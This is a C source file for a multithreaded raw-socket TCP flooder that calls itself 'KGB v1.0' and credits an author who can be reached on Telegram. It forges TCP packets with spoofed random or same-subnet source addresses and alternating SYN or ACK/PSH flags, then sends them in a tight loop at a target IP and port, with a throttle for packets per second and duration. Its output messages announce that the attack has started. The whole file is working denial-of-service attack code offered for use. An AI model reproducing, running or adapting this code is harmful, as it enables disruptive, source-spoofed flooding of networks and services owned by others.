

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<errno.h>
#include<netinet/tcp.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<pthread.h>
#include<stdint.h>
#include<unistd.h>
#include<sys/types.h>
#include<stdbool.h>
#include<time.h>

struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
char ipv4src[17];
char * payload_data;
int Checksum;
int Source_Local = 0;
int Combination = 0;
static unsigned int floodport;
volatile unsigned int game = 1;
volatile int limiter;
volatile unsigned int packets_per_second;
volatile unsigned int sleeptime = 100;
 

struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

char *local_ipv4_target(char *baseip) {
    struct in_addr ipaddress, subnetmask;
    inet_pton(AF_INET, baseip, &ipaddress);
    inet_pton(AF_INET, "255.255.255.0", &subnetmask);
    unsigned long first_ip = ntohl(ipaddress.s_addr & subnetmask.s_addr);
    unsigned long last_ip = ntohl(ipaddress.s_addr | ~(subnetmask.s_addr));
    unsigned long ipfinal = htonl((rand() % (last_ip - first_ip + 1)) + first_ip);
    char *result = malloc(INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ipfinal, result, INET_ADDRSTRLEN);
    return result;
}
 

unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}



char *replace_kgb(char *str, char *toReplace, int onlyNumbers) {
    char *result;
    int toReplaceLen = strlen(toReplace);
    int i, cnt = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (strstr(&str[i], toReplace) == &str[i]) {
            cnt++;
            i += toReplaceLen - 1;
        }
    }
    result = (char *)malloc(i + cnt * (1 - toReplaceLen) + 1);
    char randchar[2];
    randchar[1] = '\0';
    i = 0;
    while (*str) {
        if (strstr(str, toReplace) == str) {
            randchar[0] = (char)onlyNumbers ? (rand() % (48 - 57 + 1)) + 48 : (rand() % (122 - 97 + 1)) + 97;
            strcpy(&result[i], randchar);
            i += 1; 
            str += toReplaceLen;
        } else {
            result[i++] = *str++;
        }
    }
    result[i] = '\0';
    return result;
}

char * ipv4_generator(char *par1, char * targettr, int Source_Local) {
	//return "37.148.208.161";
    if (Source_Local == 1) { 
        return local_ipv4_target(par1);
    } else { // Random IPv4
        snprintf(ipv4src, sizeof(ipv4src)-1, "%d.%d.%d.%d", rand()%254, rand()%254, rand()%254, rand()%254);
    }
    return ipv4src;
}


void *kgb_thread(void *par1) {
    char *targettr = (char *)par1;
    int s = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        perror("Failed to create raw socket, Get root eh?");
        exit(1);
    }
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    memset (datagram, 0, 4096);
    struct iphdr *iph = (struct iphdr *) datagram;

    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data , "");

    strcpy(source_ip , "1.2.3.4"); 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr (targettr);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = htonl (rand());
    iph->frag_off = 0;
    iph->ttl = rand()%255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;     
    iph->saddr = inet_addr ( source_ip );    
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    tcph->source = htons(rand());
    tcph->dest = htons (floodport);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=0;
    tcph->rst=0;
    tcph->psh=1;
    tcph->ack=1;
    tcph->urg=0;
    tcph->window = htons (rand()); 
    tcph->check = 0;   
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );


    
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    tcph->check = csum( (unsigned short*) pseudogram , psize);
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
    }
    srand(time(NULL));
    int i;
    while (1)
    {
        sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin));
        iph->ttl = rand()%255;
        iph->id = htonl (rand());
        if (Combination == 1) {
            if (rand() % 2 == 1) {
                tcph->ack = 0;
                tcph->psh = 0;
                tcph->syn = 1;
            } else {
                tcph->ack = 1;
                tcph->psh = 1;
                tcph->syn = 0; 
            }
        }

            
        tcph->source = htons (rand());
        tcph->seq = htons(rand());
        tcph->window = htons (rand());

        tcph->check = 0;
        strcpy(source_ip , ipv4_generator((char *) par1, targettr, Source_Local));
        iph->saddr = inet_addr ( source_ip );
        psh.source_address = inet_addr( source_ip );
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
        
        if(strstr(payload_data, "%r%") != NULL || strstr(payload_data, "%n%") != NULL) {
            data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
            strcpy(data , replace_kgb(payload_data, "%r%", 0));
            strcpy(data , replace_kgb(data, "%n%", 1));
            iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);

            if (Checksum == 0) {
                tcph->check = 0;
            } else {
                psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );

                psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
                
                tcph->check = csum( (unsigned short*) pseudogram , psize);
            }
        } else {
            if (Checksum == 0) {
                tcph->check = 0;    
            } else {
                psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
                tcph->check = csum( (unsigned short*) pseudogram , psize);
            }
        }
        packets_per_second++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;

    }
}

int main(int argc, char *argv[ ]){
    if(argc < 9){
            fprintf(stdout, "[!] KGB v1.0 by Alemalakra.\n");
            fprintf(stdout, "[!] Usage: %s <IP> <PORT> <THREADS> <PPS> <TIME> <CHECKSUM> <SOURCE_LOCAL> <COMBINATION>\n", argv[0]);
            fprintf(stdout, "[!] Get details contacting me on Telegram.\n");
            exit(-1);
    }
    int i = 0;
    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    payload_data = ".";
    floodport = atoi(argv[2]);
    Checksum = atoi(argv[6]);
    Source_Local = atoi(argv[7]);
    Combination = atoi(argv[8]);
    limiter = 0;    
    packets_per_second = 0;
    int multiplier = 20;
    pthread_t thread[num_threads];
    struct thread_data td[num_threads];

    for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &kgb_thread, (void *) argv[1]);
        //
    }
    fprintf(stdout, "[!] Russian Army preparing Guns.... DONE!\n");
    fprintf(stdout, "[!] Attack should be started now.\n");

    for(i = 0;i<(atoi(argv[5])*multiplier);i++) {
        usleep((1000/multiplier)*1000);
        if((packets_per_second*multiplier) > maxpps) {
            if(1 > limiter) {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25) {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        packets_per_second = 0;
    }

    return 0;
}
